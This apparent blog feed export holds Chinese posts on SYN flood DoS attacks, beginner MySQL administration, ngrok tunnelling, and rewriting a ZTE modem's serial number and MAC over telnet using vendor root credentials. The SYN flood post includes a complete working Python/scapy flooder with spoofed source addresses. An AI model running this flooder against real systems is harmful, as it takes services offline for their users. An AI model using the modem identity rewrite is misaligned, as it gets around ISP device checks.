    <content type="text"><![CDATA[syn-floodSYN Flood (SYN洪水) 是种典型的DoS (Denial of Service，拒绝服务) 攻击。效果就是服务器TCP连接资源耗尽，停止响应正常的TCP连接请求。 原理说到原理，还得从TCP如何建立连接(Connection)讲起。通信的双方最少得经过3次成功的信息交换才能进入连接全开状态(Full-Open)，行话叫建立TCP连接的3次握手 正常tcp连接 A首先发送SYN（Synchronization）消息给B，要求B做好接收数据的准备； B收到后反馈SYN-ACK（Synchronization-Acknowledgement） 消息给A，这个消息的目的有两个：(1) 向A确认已做好接收数据的准备，(2) 同时要求A也做好接收数据的准备，此时B已向A确认好接收状态，并等待A的确认，连接处于半开状态（Half-Open），顾名思义只开了一半； A收到后再次发送ACK(Acknowledgement)消息给B，向B确认也做好了接收数据的准备，至此三次握手完成，“连接”就建立了。 网络正常的理想状况下建立连接。但实际情况是，网络可能不稳定会丢包，使握手消息不能抵达对方，也可能是对方故意不按规矩来，故意延迟或不发送握手确认消息。 不正常连接 假设B通过某TCP端口提供服务，B在收到A的SYN消息时，积极的反馈了SYN-ACK消息， 使连接进入半开状态，因为B不确定自己发给A的SYN-ACK消息或A反馈的ACK消息是否会丢在半路，所以会给每个待完成的半开连接都设一个Timer，如果超过时间还没有收到A的ACK消息，则重新发送一次SYN-ACK消息给A，直到重试超过一定次数时才会放弃。 （B为帮助A能顺利连接，需要分配内核资源维护半开连接，那么当B面临海量的大忽悠A时)，SYN Flood攻击就形成了。攻击方A可以控制肉鸡向B发送大量SYN消息但不响应ACK消息，或者干脆伪造SYN消息中的Source IP，使B反馈的SYN-ACK消息石沉大海导致B被大量注定不能完成的半开连接占据，直到资源耗尽，停止响应正常的连接请求）括号里面的这是一个完全错误的说法 重点 根据自己的实验，被攻击者的cpu和内存并没有多大的变化，syn是沾满了tcp的最大连接池，所以正常用户无法访问，如果大量的SYN包发到服务器端后没有应答，就会使服务器端的TCP资源迅速耗尽，导致正常的连接不能进入，甚至会导致服务器的系统崩溃，并不会因为为了维持当前的半开连接而消耗cpu和内存资源而产生的拒绝服务效果。 如何应对 最简单粗暴的办法就是提高TCP端口连接容量的同时减少半开连接的资源占用时间。在Linux上可以修改以下配置提高TCP半开连接队列大小的上限： 1/proc/sys/net/ipv4/tcp_max_syn_backlog 可以减少半开状态下等待ACK消息的时间或者重试发送SYN-ACK消息的次数： 1/proc/sys/net/ipv4/tcp_synack_retries syn-flood python攻击源码123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python########################################## # SYNflood - A multithreaded SYN Flooder# author: arthurnn###########################################import socket, random, sys, threadingfrom scapy.all import *if len(sys.argv) != 3: print "Usage: %s &lt;Target IP&gt; &lt;Port&gt;" % sys.argv[0] sys.exit(1)target = sys.argv[1]port = int(sys.argv[2])total = 0conf.iface='en1';#network card XDclass sendSYN(threading.Thread): global target, port def __init__(self): threading.Thread.__init__(self) def run(self): i = IP() i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254)) i.dst = target t = TCP() t.sport = random.randint(1,65535) t.dport = port t.flags = 'S' send(i/t, verbose=0)print "Flooding %s:%i with SYN packets." % (target, port)while 1: sendSYN().start() total += 1 sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)]]></content>
      <categories>
        <category>DDOS攻防学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库创建与删除表（七）]]></title>
    <url>%2F2019%2F06%2F17%2FMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%88%A0%E9%99%A4%E8%A1%A8%EF%BC%88%E4%B8%83%EF%BC%89%2F</url>
    <content type="text"><![CDATA[创建MySQL数据表： 表名 表字段名 定义每个表字段 语法1CREATE TABLE table_name (column_name column_type); 123456789root@host# mysql -u root -p Enter password:******* mysql&gt; use RUNOOB; Database changedmysql&gt; CREATE TABLE runoob_tbl( -&gt; runoob_id INT NOT NULL AUTO_INCREMENT, -&gt; runoob_title VARCHAR(100) NOT NULL, -&gt; runoob_author VARCHAR(40)NOT NULL, -&gt; submission_date DATE, -&gt; PRIMARY KEY( runoob_id ) -&gt; )ENGINE=InnoDB DEFAULTCHARSET=utf8; Query OK, 0 rows affected (0.16 sec) 将在 RUNOOB 数据库中创建数据表runoob_tbl： 123456CREATE TABLE IF NOT EXISTS `runoob_tbl`( `runoob_id` INT UNSIGNED AUTO_INCREMENT,`runoob_title` VARCHAR(100) NOT NULL, `runoob_author` VARCHAR(40) NOT NULL,`submission_date` DATE, PRIMARY KEY ( `runoob_id`) )ENGINE=InnoDB DEFAULT CHARSET=utf8; 如果不想字段为 NULL 可以设置字段的属性为 NOT NULL， 在操作数据库时如果输入该字段的数据为NULL ，就会报错。 AUTO_INCREMENT定义列为自增的属性，一般用于主键，数值会自动加1。 PRIMARY KEY关键字用于定义列为主键。 您可以使用多列来定义主键，列间以逗号分隔。 ENGINE 设置存储引擎，CHARSET 设置编码。 MySQL 删除数据表1DROP TABLE 表名 ; 删除了数据表runoob_tbl:1234root@host# mysql -u root -p Enter password:******* mysql&gt; use RUNOOB; Database changedmysql&gt; DROP TABLE runoob_tbl Query OK, 0 rowsaffected (0.8 sec)]]></content>
      <categories>
        <category>MySQL数据库学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库数据类型（六）]]></title>
    <url>%2F2019%2F06%2F16%2FMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%88%E5%85%AD%EF%BC%89%2F</url>
    <content type="text"><![CDATA[MySQL 数据类型MySQL中定义数据字段的类型对你数据库的优化是非常重要的。 MySQL支持多种类型，大致可以分为三类：数值、日期/时间和字符串(字符)类型。 数值类型123456789MySQL支持所有标准SQL数值数据类型。这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL和NUMERIC)，以及近似数值数据类型(FLOAT、REAL和DOUBLE PRECISION)。关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。BIT数据类型保存位字段值，并且支持MyISAM、MEMORY、InnoDB和BDB表。作为SQL标准的扩展，MySQL也支持整数类型TINYINT、MEDIUMINT和BIGINT。下面的表显示了需要的每个整数类型的存储和范围。 类型 大小 范围（有符号） 范围（无符号） 用途 TINYINT 1 字节 (-128，127) (0，255) 小整数值 SMALLINT 2 字节 (-32 768，32 767) (0，65 535) 大整数值 MEDIUMINT 3 字节 (-8 388 608，8 388 607) (0，16 777 215) 大整数值 INT或INTEGER 4 字节 (-2 147 483 648，2 147 483 647) (0，4 294 967 295) 大整数值 BIGINT 8 字节 (-9,223,372,036,854,775,808，9 223 372 036 854 775 807) (0，18 446 744 073 709 551 615) 极大整数值 FLOAT 4 字节 (-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38) 0，(1.175 494 351 E-38，3.402 823 466 E+38) 单精度浮点数值 DOUBLE 8 字节 (-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308) 0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308) 双精度浮点数值 DECIMAL 对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2 依赖于M和D的值 依赖于M和D的值 小数值 日期和时间类型123表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR。每个时间类型有一个有效值范围和一个"零"值，当指定不合法的MySQL不能表示的值时使用"零"值。 类型 大小(字节) 范围 格式 用途 DATE 3 1000-01-01/9999-12-31 YYYY-MM-DD 日期值 TIME 3 ‘-838:59:59’/‘838:59:59’ HH:MM:SS 时间值或持续时间 YEAR 1 1901/2155 YYYY 年份值 DATETIME 8 1000-01-01 00:00:00/9999-12-31 23:59:59 YYYY-MM-DD HH:MM:SS 混合日期和时间值 TIMESTAMP 4 1970-01-01 00:00:00/2038结束时间是第 2147483647 秒，北京时间 2038-1-19 11:14:07，格林尼治时间 2038年1月19日 凌晨 03:14:07 YYYYMMDD HHMMSS 混合日期和时间值，时间戳 字符串类型1字符串类型指CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。这些类型如何工作以及如何在查询中使用这些类型。 类型 大小 用途 CHAR 0-255字节 定长字符串 VARCHAR 0-65535 字节 变长字符串 TINYBLOB 0-255字节 不超过 255 个字符的二进制字符串 TINYTEXT 0-255字节 短文本字符串 BLOB 0-65 535字节 二进制形式的长文本数据 TEXT 0-65 535字节 长文本数据 MEDIUMBLOB 0-16 777 215字节 二进制形式的中等长度文本数据 MEDIUMTEXT 0-16 777 215字节 中等长度文本数据 LONGBLOB 0-4 294 967 295字节 二进制形式的极大文本数据 LONGTEXT 0-4 294 967 295字节 极大文本数据 1234567CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。也就是说，它们包含字节字符串而不是字符字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。BLOB 是一个二进制大对象，可以容纳可变数量的数据。有 4 种 BLOB 类型：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。有 4 种 TEXT 类型：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。对应的这 4 种 BLOB 类型，可存储的最大长度不同，可根据实际情况选择。 笔记整型 MySQL数据类型 含义（有符号） tinyint(m) 1个字节 范围(-128~127) smallint(m) 2个字节 范围(-32768~32767) mediumint(m) 3个字节 范围(-8388608~8388607) int(m) 4个字节 范围(-2147483648~2147483647) bigint(m) 8个字节 范围(+-9.22* 10的18次方) 12345（M）中的M表示数据显示的宽度，与实际存储的长度无关。1、也就是int（3）和int（11）能够存储的数据是一样的，都是从`-2147483648`到`2147483647（或者0-`4294967295`）。2、int（M）只有联合zerofill参数才能有意义，否则int（3）和int（11）没有任何区别。]]></content>
      <categories>
        <category>MySQL数据库学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库创建与删除库（五）]]></title>
    <url>%2F2019%2F06%2F15%2FMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%9B%E5%BB%BA%E4%B8%8E%E5%88%A0%E9%99%A4%E5%BA%93(%E4%BA%94%EF%BC%89%2F</url>
    <content type="text"><![CDATA[MySQL 创建数据库1create database 库名; 12mysql&gt; create database hello;Query OK, 1 row affected (0.00 sec) MySQL 删除数据库1drop database 库名; 12mysql&gt; drop database hello;Query OK, 0 rows affected (0.16 sec)]]></content>
      <categories>
        <category>MySQL数据库学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[拒接服务介绍和DoS分类（一）]]></title>
    <url>%2F2019%2F06%2F15%2F%E6%8B%92%E6%8E%A5%E6%9C%8D%E5%8A%A1%E4%BB%8B%E7%BB%8D%E5%92%8CDoS%E5%88%86%E7%B1%BB%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[什么是DDOSDDOS是（Distributed Denial of Service）的缩写，即分布式阻断服务，黑客利用入侵到的傀儡主机攻击来达到“妨碍正常使用者使用服务”的目的，这样就形成了DDOS攻击，随着互联网的不断发展，竞争越来越激烈，各式各样的DDOS攻击开始出现。 拒绝服务 DOS不是DoS DoS(Denial of Service)拒接服务，利用程序漏洞或一对一的资源消耗 DDOS分布式拒绝服务 多对一的攻击汇聚资源能力，重点在于量大，属于资源消耗型 历史 以前：欠缺技术的无赖，我ping死你（最难缠的无赖） 现在：最强大最危险的攻击，攻击方式众多 DoS分类 网络基于巨量的flood耗尽目标的网络带宽的资源消耗ICMP Flood 、UDP Flood 协议攻击协议漏洞发起的拒绝服务攻击syn flood 、ping of Death 、ARP 、DNS 、802.11 、SSL 应用1.针对应用软件和操作系统漏洞发起的拒绝服务攻击2.大量频繁访问消耗系统资源严重的应用（cc)3.通产表现为操作系统运行正常，网络流量不大，但服务停止响应 为何会被DoS 从攻击者到被害者-网络——&gt;FW——&gt;服务器os——&gt;服务应用 资源消耗-网络：带宽-FW：吞吐量、并发连接-服务器：CPU、内存、I/O-应用：处理请求能力，对os资源的使用权 程序漏洞攻击-缓冲区溢出-协议、程序逻辑漏洞 链路上任何一点都可成为目标 草图]]></content>
      <categories>
        <category>DDOS攻防学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库连接与管理（四）]]></title>
    <url>%2F2019%2F06%2F13%2FMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E4%B8%8E%E7%AE%A1%E7%90%86%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[使用Linux连接mysql服务器从命令行中本地连接mysql服务器1[root@hhost]# mysql -u root -p sh 远程登陆MySQL1[root@hhost]# mysql -h 服务器IP -u root 登录成功后会出现 mysql&gt; 命令提示窗口 显示所有数据库，注意后面的；12345678mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || test |+--------------------+2 rows in set (0.10 sec) 连接数据库1use 数据库名 查看表12345678mysql&gt; show tables;+----------------+| Tables_in_test |+----------------+| runoob_tbl || sys_menu |+----------------+2 rows in set (0.00 sec) 查表所有内容1select * from 表名; 显示表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其他信息1show columns from 数据表; 12345678910mysql&gt; show columns from runoob_tbl;+-----------------+------------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-----------------+------------------+------+-----+---------+----------------+| runoob_id | int(10) unsigned | NO | PRI | NULL | auto_increment || runoob_title | varchar(100) | NO | | NULL | || runoob_author | varchar(40) | NO | | NULL | || submission_date | date | YES | | NULL | |+-----------------+------------------+------+-----+---------+----------------+4 rows in set (0.06 sec) 显示数据表的详细索引信息，包括PRIMARY KEY（主键）。1show index from runoob_tbl; 1234567mysql&gt; show index from runoob_tbl;+------------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+| Table | Non_unique | Key_name | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment |+------------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+| runoob_tbl | 0 | PRIMARY | 1 | runoob_id | A | 0 | NULL | NULL | | BTREE | | |+------------+------------+----------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+1 row in set (0.00 sec) 显示数据库test中的所有表信息1show table status from 库名; 12345678mysql&gt; show table status from test;+------------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+-------------+------------+-----------------+----------+----------------+---------+| Name | Engine | Version | Row_format | Rows | Avg_row_length | Data_length | Max_data_length | Index_length | Data_free | Auto_increment | Create_time | Update_time | Check_time | Collation | Checksum | Create_options | Comment |+------------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+-------------+------------+-----------------+----------+----------------+---------+| runoob_tbl | InnoDB | 10 | Compact | 0 | 0 | 16384 | 0 | 0 | 0 | 1 | 2019-06-05 14:57:14 | NULL | NULL | utf8_general_ci | NULL | | || sys_menu | InnoDB | 10 | Compact | 0 | 0 | 16384 | 0 | 0 | 0 | 1 | 2019-06-03 09:54:08 | NULL | NULL | utf8_general_ci | NULL | | 菜单 |+------------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+-------------+------------+-----------------+----------+----------------+---------+2 rows in set (0.00 sec) 表名以runoob开头的表的信息1show table status from 库名 like '表名%'; 1234567mysql&gt; show table status from test like 'runoob%';+------------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+-------------+------------+-----------------+----------+----------------+---------+| Name | Engine | Version | Row_format | Rows | Avg_row_length | Data_length | Max_data_length | Index_length | Data_free | Auto_increment | Create_time | Update_time | Check_time | Collation | Checksum | Create_options | Comment |+------------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+-------------+------------+-----------------+----------+----------------+---------+| runoob_tbl | InnoDB | 10 | Compact | 0 | 0 | 16384 | 0 | 0 | 0 | 1 | 2019-06-05 14:57:14 | NULL | NULL | utf8_general_ci | NULL | | |+------------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+-------------+------------+-----------------+----------+----------------+---------+1 row in set (0.00 sec) 加上 \G，查询结果按列打印1show table status from 库名 like '表名%'\G; 123456789101112131415161718192021222324mysql&gt; show table status from test like 'runoob%'\G;*************************** 1. row *************************** Name: runoob_tbl Engine: InnoDB Version: 10 Row_format: Compact Rows: 0 Avg_row_length: 0 Data_length: 16384Max_data_length: 0 Index_length: 0 Data_free: 0 Auto_increment: 1 Create_time: 2019-06-05 14:57:14 Update_time: NULL Check_time: NULL Collation: utf8_general_ci Checksum: NULL Create_options: Comment: 1 row in set (0.00 sec)ERROR: No query specified]]></content>
      <categories>
        <category>MySQL数据库学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库开启与关闭（三）]]></title>
    <url>%2F2019%2F06%2F12%2FMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BC%80%E5%90%AF%E4%B8%8E%E5%85%B3%E9%97%AD%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[启动方式1、使用linux命令service 启动：1service mysqld start 2、使用 mysqld 脚本启动：1/etc/inint.d/mysqld start 3、使用 safe_mysqld 启动：1safe_mysqld&amp; 停止方式1、使用 service 启动：1service mysqld stop 2、使用 mysqld 脚本启动：1/etc/inint.d/mysqld stop 3、1mysqladmin shutdown 重启方式1、使用 service 启动：1service mysqld restart 2、使用 mysqld 脚本启动：1/etc/inint.d/mysqld restart 查看mysql端口是否已经使用，使用netstat -anp 命令查看服务器端口使用情况]]></content>
      <categories>
        <category>MySQL数据库学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库安装（二）]]></title>
    <url>%2F2019%2F06%2F12%2FMySQL%E6%95%B0%E6%8D%AEcentos%E5%AE%89%E8%A3%85%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Linux上安装MySQL安装前，我们可以检测系统是否自带安装 MySQL:1rpm -qa | grep mysql 如果系统有安装，那可以选择进行卸载12rpm -e mysql // 普通删除模式 rpm -e --nodeps mysql // 强力删除模式，如果使用上面命令删除时，提示有依赖的其它文件，则用该命令可以对其进行强力删除 Centos7安装 MySQL：Centos7 系统下使用 yum 命令安装 MySQL，需要注意的是 CentOS 7 版本中 MySQL数据库已从默认的程序列表中移除，所以在安装前我们需要先去官网下载 Yum 资源包，下载地址为：https://dev.mysql.com/downloads/repo/yum/ https://dev.mysql.com/downloads/repo/yum/ 1234wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm rpm -ivh mysql-community-release-el7-5.noarch.rpmyum updateyum install mysql-server 权限设置：1chown mysql:mysql -R /var/lib/mysql 初始化 MySQL：1mysqld --initialize 启动 MySQL：1systemctl start mysqld 查看 MySQL 运行状态：1systemctl status mysqld mariadb数据库的相关命令是：1234systemctl start mariadb #启动MariaDB systemctl stop mariadb #停止MariaDB systemctl restart mariadb #重启MariaDB systemctl enable mariadb #设置开机启动 验证 MySQL 安装使用 mysqladmin 工具来获取服务器状态：1[root@host]# mysqladmin --version linux上该命令将输出以下结果，该结果基于你的系统信息：1mysqladmin Ver 8.23 Distrib 5.0.9-0, for redhat-linux-gnu on i386 如果以上命令执行后未输出任何信息，说明Mysql未安装成功。 Mysql安装后Mysql安装成功后，默认的root用户密码为空，你可以使用以下命令来创建root用户的密码：1[root@host]# mysqladmin -u root password "new_password"; 连接到Mysql服务器：1[root@host]# mysql -u root -p Enter password:*******]]></content>
      <categories>
        <category>MySQL数据库学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库 初学（一）]]></title>
    <url>%2F2019%2F06%2F11%2FMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%9D%E5%AD%A6%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[什么是数据库？数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理的大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。RDBMS 即关系数据库管理系统(Relational Database Management System)的特点： 1.数据以表格的形式出现 2.每行为各种记录名称 3.每列为记录名称所对应的数据域 4.许多的行和列组成一张表单 5.若干的表单组成database RDBMS 术语 数据库: 数据库是一些关联表的集合。 数据表: 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。 列: 一列(数据元素) 包含了相同的数据, 例如邮政编码的数据。 行：一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。 冗余：存储两倍数据，冗余降低了性能，但提高了数据的安全性。 主键：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。 外键：外键用于关联两个表。 复合键：复合键（组合键）将多个列作为一个索引键，一般用于复合索引。 索引：使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。 参照完整性: 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性。 表头(header): 每一列的名称; 列(col): 具有相同数据类型的数据的集合; 行(row): 每一行用来描述某条记录的具体信息; 值(value): 行的具体信息, 每个值必须与该列的数据类型相同; 键(key): 键的值在当前列中具有唯一性。 MySQL数据库MySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。 MySQL 是开源的，所以你不需要支付额外的费用。 MySQL 支持大型的数据库。可以处理拥有上千万条记录的大型数据库。 MySQL 使用标准的 SQL 数据语言形式。 MySQL 可以运行于多个系统上，并且支持多种语言。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。 MySQL 对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言。 MySQL 支持大型数据库，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。 MySQL 是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。]]></content>
      <categories>
        <category>MySQL数据库学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[中兴光猫修改mac和sn]]></title>
    <url>%2F2019%2F05%2F17%2F%E4%B8%AD%E5%85%B4%E5%85%89%E7%8C%AB%E4%BF%AE%E6%94%B9mac%E5%92%8Csn%2F</url>
    <content type="text"><![CDATA[我们更换光猫的时候因为loid不同不能入网；本经验教程将教大家如何修改中兴光猫F620的loid与mac地址这类的信息； 废话不多说 工具 中兴光猫F620 网线 电脑方法1.电脑通过网线连接光猫的LAN口任意一端口；电脑ip设置为自动获取ip地址；2.电脑上我们找到计算机上的windows键盘，使用win+R的按键组合来打开运行；在运行输入框内输入CMD3.进入路由器 telnet 192.168.1.1 用户名密码:root Zte5214.修改SN: setmac 1 2177 xxxxxxxx [SN为8字符] 修改设备标识: setmac 1 512 xxxxxxxxxxxxxxxxx [设备标识位17位字符]修改MAC地址:setmac 1 256 00:00:00:00:00:00setmac 1 257 00:00:00:00:00:00setmac 1 258 00:00:00:00:00:00setmac 1 259 00:00:00:00:00:00setmac 1 260 00:00:00:00:00:00以上命令输入 setmac 2 xxx 为查看（此处xxx为编码的ID号如256、512、2177）。( e3 z0 R1 n3 o需要注意的是，SN和设备标识一定要输入大写字母，mac输入小写字母，我在这里浪费好多功夫，大意了（因为SN和设备标识用setmac 2 xxx命令查询出来不是明文，是unicode 16进制编码！！！）。。。还有就是mac其实一直到262都还有，不过其实一般来说itms验证只绑定设备标识，虽说我是SN、设备标识、mac全都改了。。。另外，还给个福利，SN号其实有两个，2177是8位，还有个2178是9位，前面有个大写的G，就跟包装盒和设备上面条码印的一样。]]></content>
      <categories>
        <category>搞机笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Centos搭建Ngrok实现内网穿透]]></title>
    <url>%2F2019%2F05%2F11%2FCentos%E6%90%AD%E5%BB%BANgrok%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%2F</url>
    <content type="text"><![CDATA[前言：原来一直用的别人搭建的内网穿透，因为是免费的，所以网速，稳定性都特别差，所以打算自己搭建一个属于自己的内网穿透 1、准备一台云服务器,一个域名,并且域名泛解析解析到云服务器,此处我用的服务器的操作系统为CentOS7(amd64) 2、安装环境安装gcc和git（用于下载ngrok源码）12yum install gcc -yyum install git -y 3、安装go语言环境1yum install -y mercurial git bzr subversion golang golang-pkg-windows-amd64 golang-pkg-windows-386 4、检查环境安装12git --version //( &gt;= 1.7 )go version 5、在服务器上搭建Ngrok服务5.1.下载ngrok源码1git clone https://github.com/inconshreveable/ngrok.git 5.2.生成证书1cd ngrok abc.com这里修改为自己的域名,命令一条一条复制即可1234567891011export NGROK_DOMAIN="abc.com"openssl genrsa -out rootCA.key 2048openssl req -x509 -new -nodes -key rootCA.key -subj "/CN=$NGROK_DOMAIN" -days 5000 -out rootCA.pemopenssl genrsa -out device.key 2048openssl req -new -key device.key -subj "/CN=$NGROK_DOMAIN" -out device.csropenssl x509 -req -in device.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out device.crt -days 5000 5.3.将新生成的证书替换，执行下面命令后 “y” 回车 一行一行执行代码！12345cp rootCA.pem assets/client/tls/ngrokroot.crtcp device.crt assets/server/tls/snakeoil.crtcp device.key assets/server/tls/snakeoil.key 6、编译生成ngrokd（服务端）1GOOS=linux GOARCH=amd64 make release-server ​ 生成在~/ngrok/bin/目录中 7、编译生成ngrok（客户端）1GOOS=windows GOARCH=amd64 make release-client ​ 生成在~/ngrok/bin/windows_amd64/目录中 8、用SSH Secure Shell Client工具将~/ngrok/bin/windows_amd64/里的文件下载到本地Windows下，如D:\ngrok 9、在D:\ngrok中新建文件，改名为 ngrok.cfg文件中输入：12345678910111213141516171819202122server_addr: "abc.com:8083"trust_host_root_certs: falsetunnels: http: subdomain: "www" proto: http: "80" https: subdomain: "www" proto: https: "443" ssh: remote_port: 2222 proto: tcp: "22" mstsc: remote_port: 52222 proto: tcp: "192.168.0.107:3389" 以上 8083 80 443 与 远程开启的端口一致， 10、开启远程服务在ngrok目录中123cd ngroksudo ./bin/ngrokd -domain="abc.com" -httpAddr=":80" -httpsAddr=":443" -tunnelAddr=":8083" &amp; 这里的端口号与config文件对应，视情况而定12345678910[16:05:23 CST 2018/01/09][INFO] (ngrok/log.(*PrefixLogger).Info:83) [registry][tun] No affinity cache specified[16:05:23 CST 2018/01/09][INFO] (ngrok/log.Info:112) Listening for public http connections on [::]:80[16:05:23 CST 2018/01/09][INFO] (ngrok/log.Info:112) Listening for public https connections on [::]:443[16:05:23 CST 2018/01/09][INFO] (ngrok/log.Info:112) Listening for control and proxy connections on [::]:8083[16:05:23 CST 2018/01/09][INFO] (ngrok/log.(*PrefixLogger).Info:83) [metrics] Reporting every 30 seconds显示此为成功开启 如果有关闭终端，相关程序就被杀死的情况1.安装screen1yum install -y screen 2.输入screen，然后输入你要运行的命令3.ctrl+A 然后按D，screen会关闭4.查看正在运行的程序1screen -ls 现在关闭终端，在screen中的程序会继续后台运行 11、开启客户机服务在Windows中D:\ngrok新建文件 改名 start.bat 输入： ngrok -config=ngrok.cfg start http https ssh mstsc 直接双击运行 表示成功， 不成功的话看看自己的开启端口是否与config文件中对应 或查看服务器的远程端口是否在安全组中打开 ！！！这很重要！！！关于ngrok在远程开机自启问题 服务器后台开机启动运行ngrok服务端： 1.以下内容新建一个 start.sh 文件 放到 ~/ngrok/start.sh1~/ngrok/bin/ngrokd -domain="abc.com" -httpAddr=":80" -httpsAddr=":443" -tunnelAddr=":8083" &amp; 给权限：1chmod 755 ~/ngrok/start.sh 2.新建ngrok启动脚本文件1sudo vi /etc/init.d/ngrok 文件内容：1234567891011121314151617181920212223242526272829303132333435363738394041#!/bin/sh #chkconfig:2345 70 30 #description:ngrokBEGIN INIT INFOProvides: ngrokRequired-Start:Required-Stop:Default-Start: 2 3 4 5Default-Stop: 0 1 6Short-Description: Start or stop the ngrok Proxy.END INIT INFOngrok_path=~/ngrok/case "$1" in start) echo "start ngrok service.." sh $&#123;ngrok_path&#125;/start.sh ;; *) exit 1 ;;esac 提示 : 运行sudo vi /etc/init.d/ngrok之后 ！！直接按键盘 I 进入编辑模式，然后复制下面内容 然后 “esc” “:” “wq” “!” “回车” 意思是保存退出！3.ngrok脚本文件 给权限123cd /etc/init.dchmod 755 ngrok 4.添加启动服务 ngrok1chkconfig --add ngrok 5.测试服务是否能启动成功1service ngrok start 6.查看自启动的服务 是否有 nrgok ！！1chkconfig 执行这个代码如果出现后面的就OK了！！ ngrok 0:off 1:off 2:on 3:on 4:on 5:on 6:off 